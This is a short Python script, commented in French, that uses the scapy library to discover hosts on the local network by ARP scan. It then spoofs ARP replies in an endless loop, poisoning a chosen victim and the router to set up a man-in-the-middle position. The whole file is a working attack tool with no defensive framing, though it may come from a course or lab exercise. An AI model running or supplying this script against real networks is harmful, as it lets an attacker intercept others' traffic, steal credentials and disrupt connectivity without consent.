#!/usr/bin/env python3

from scapy.all import *
from scapy.all import IP, Ether, ARP, UDP, DNS, DNSRR, DNSQR

network_addr = get_if_addr(conf.iface).split('.')
network_addr = network_addr[0] + "." + network_addr[1] + "." + network_addr[2] + ".0/24" # obtient l'adresse ip du réseau
mac_of_atk = get_if_hwaddr(conf.iface) # obtient l'adresse mac de l'attaquant

arp_packet = Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=network_addr) # Cree les paquets

IP_MAC_responses, unans = srp(arp_packet, timeout=2)

MAC_on_network = []
IP_on_network = []

for i in range(len(IP_MAC_responses)):
    MAC_on_network.append(IP_MAC_responses[i][1].hwsrc) # récupére les mac dans le réseau
    IP_on_network.append(IP_MAC_responses[i][1].psrc) # récupére les ip dans le réseau

victim_IP = IP_on_network[1]
victim_MAC = MAC_on_network[1]

routeur_IP = IP_on_network[2]
routeur_MAC = MAC_on_network[2]

while True: # MITM 
    spoof_arp_routeur = Ether(src=mac_of_atk)/ARP(op=2, pdst=routeur_IP, hwdst=routeur_MAC, psrc=victim_IP)
    spoof_arp_victim = Ether(src=mac_of_atk)/ARP(op=2, pdst=victim_IP, hwdst=victim_MAC, psrc=routeur_IP)
    send_spoof2 = sendp(spoof_arp_routeur)
    send_spoof1 = sendp(spoof_arp_victim)